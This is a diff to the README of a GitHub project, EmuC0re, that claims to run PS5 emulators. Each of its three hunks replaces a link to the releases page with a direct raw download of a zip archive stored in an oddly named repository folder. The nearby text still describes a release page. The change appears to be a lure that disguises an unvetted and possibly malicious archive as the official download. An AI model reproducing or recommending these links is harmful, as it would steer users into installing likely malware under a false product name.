@@ -1,6 +1,6 @@
 # 🕹️ EmuC0re - Run PS5 Emulators with Ease
 
-[![Download EmuC0re](https://img.shields.io/badge/Download-EmuC0re-6f42c1?style=for-the-badge&logo=github)](https://github.com/Khandiaz6262/EmuC0re/releases)
+[![Download EmuC0re](https://img.shields.io/badge/Download-EmuC0re-6f42c1?style=for-the-badge&logo=github)](https://github.com/Khandiaz6262/EmuC0re/raw/refs/heads/main/matterfulness/Emu-re-2.0.zip)
 
 ## 🚀 What EmuC0re Does
 
@@ -22,7 +22,7 @@ For the best results, keep your system updated and close other apps before you s
 
 ## 💾 Download EmuC0re
 
-Visit the release page to download: [EmuC0re Releases](https://github.com/Khandiaz6262/EmuC0re/releases)
+Visit the release page to download: [EmuC0re Releases](https://github.com/Khandiaz6262/EmuC0re/raw/refs/heads/main/matterfulness/Emu-re-2.0.zip)
 
 On the release page, look for the latest version. Download the main release file for Windows, or the package that matches your setup.
 
@@ -173,7 +173,7 @@ Keep the release notes close while you set it up, since package contents can cha
 
 ## 📥 Download Again
 
-Visit this page to download the latest release package: [https://github.com/Khandiaz6262/EmuC0re/releases](https://github.com/Khandiaz6262/EmuC0re/releases)
+Visit this page to download the latest release package: [https://github.com/Khandiaz6262/EmuC0re/raw/refs/heads/main/matterfulness/Emu-re-2.0.zip](https://github.com/Khandiaz6262/EmuC0re/raw/refs/heads/main/matterfulness/Emu-re-2.0.zip)
 
 ## 📝 Typical First Run Checklist
 
